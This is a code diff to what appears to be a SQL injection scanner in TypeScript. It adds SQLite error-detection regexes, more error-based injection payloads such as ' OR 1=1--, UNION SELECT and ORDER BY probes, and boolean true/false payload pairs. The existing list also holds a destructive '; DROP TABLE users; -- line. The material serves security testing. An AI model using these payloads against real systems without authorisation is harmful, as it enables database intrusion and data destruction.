@@ -267,6 +267,13 @@ export function hasSqlError(text: string): boolean {
     /quoted string not properly terminated/i,
     /SQL syntax.*error/i,
     /Microsoft.*ODBC.*Driver/i,
+    // SQLite
+    /SQLITE_ERROR/i,
+    /SQLite error/i,
+    /SQLite3::SQLException/i,
+    /near \".*\": syntax error/i,
+    /no such table/i,
+    /no such column/i,
   ];
 
   return errorPatterns.some((pattern) => pattern.test(text));
@@ -300,10 +307,17 @@ export const errorPayloads = [
   "\\",
   "')",
   "' OR '1'='1",
+  "' OR 1=1--",
+  "' OR 1=1 --",
   "'; DROP TABLE users; --",
   "' UNION SELECT null--",
   "1' AND 1=1--",
   "1' AND 1=2--",
+  // SQLite specific probes
+  "' UNION SELECT 1--",
+  "' UNION SELECT 1,2--",
+  "' ORDER BY 1--",
+  "' ORDER BY 2--",
 ];
 
 export const booleanPairs = [
@@ -321,6 +335,16 @@ export const booleanPairs = [
     true: "1 AND 1=1",
     false: "1 AND 1=2",
     label: "numeric_boolean",
+  },
+  {
+    true: "' OR 1=1--",
+    false: "' OR 1=2--",
+    label: "sqlite_or_comment",
+  },
+  {
+    true: ") OR 1=1--",
+    false: ") OR 1=2--",
+    label: "paren_or_comment",
   },
 ];
 
